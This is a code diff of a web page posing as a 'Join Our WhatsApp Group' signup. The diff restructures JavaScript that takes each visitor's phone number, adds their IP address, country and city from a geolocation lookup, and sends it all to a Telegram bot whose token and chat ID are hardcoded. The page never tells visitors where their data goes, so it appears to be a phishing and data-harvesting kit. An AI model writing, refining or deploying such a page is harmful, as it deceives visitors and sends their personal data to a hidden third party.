@@ -29,7 +29,7 @@
     <img src="172245867233593622.png" alt="Logo" class="logo" />
     <h2>Join Our WhatsApp Group</h2>
     <form id="phone-form">
-      <input id="phone" class="phone-input" type="tel" placeholder="+1 234 567 8900" required autocomplete="off" />
+      <input id="phone" class="phone-input" type="tel" placeholder="" required autocomplete="off" />
       <button type="submit">Join Now</button>
     </form>
   </div>
@@ -55,45 +55,43 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
   <script>
     const input = document.querySelector("#phone");
-    let userCountry = "us"; // fallback
+    let iti;
 
     fetch("https://ipapi.co/json")
       .then(response => response.json())
       .then(data => {
-        userCountry = data.country_code.toLowerCase();
-        iti.setCountry(userCountry);
-      });
+        const countryCode = data.country_code.toLowerCase();
+        const phoneExample = data.country_calling_code + " 123 456 789";
+        input.placeholder = phoneExample;
 
-    const iti = window.intlTelInput(input, {
-      initialCountry: "auto",
-      geoIpLookup: callback => callback(userCountry),
-      utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
-    });
+        iti = window.intlTelInput(input, {
+          initialCountry: countryCode,
+          utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+        });
 
-    document.getElementById("phone-form").addEventListener("submit", function (e) {
-      e.preventDefault();
+        document.getElementById("phone-form").addEventListener("submit", function (e) {
+          e.preventDefault();
 
-      if (!iti.isValidNumber()) {
-        alert("Please enter a valid phone number.");
-        return;
-      }
+          if (!iti.isValidNumber()) {
+            alert("Please enter a valid phone number.");
+            return;
+          }
 
-      const phoneNumber = iti.getNumber();
-      const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY";
-      const chatId = "7196613507";
-
-      fetch("https://ipapi.co/json")
-        .then(response => response.json())
-        .then(data => {
+          const phoneNumber = iti.getNumber();
           const ip = data.ip || "N/A";
           const country = data.country_name || "N/A";
           const city = data.city || "N/A";
 
           const message = `New Submission:\n📞 Phone: ${phoneNumber}\n🌍 Country: ${country}\n🏙️ City: ${city}\n💻 IP: ${ip}`;
 
+          const botToken = "7164624615:AAE_28P52PeaX1L3BWjbCfWRfIfu2QkWoiY";
+          const chatId = "7196613507";
+
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            headers: {
+              "Content-Type": "application/json"
+            },
             body: JSON.stringify({
               chat_id: chatId,
               text: message
@@ -112,12 +110,12 @@
             alert("Something went wrong. Try again.");
             console.error("Fetch error:", err);
           });
-        })
-        .catch(err => {
-          alert("Unable to fetch your location. Try again.");
-          console.error("IPAPI error:", err);
         });
-    });
+      })
+      .catch(err => {
+        alert("Unable to fetch your location. Try again.");
+        console.error("IPAPI error:", err);
+      });
   </script>
 </body>
 </html>
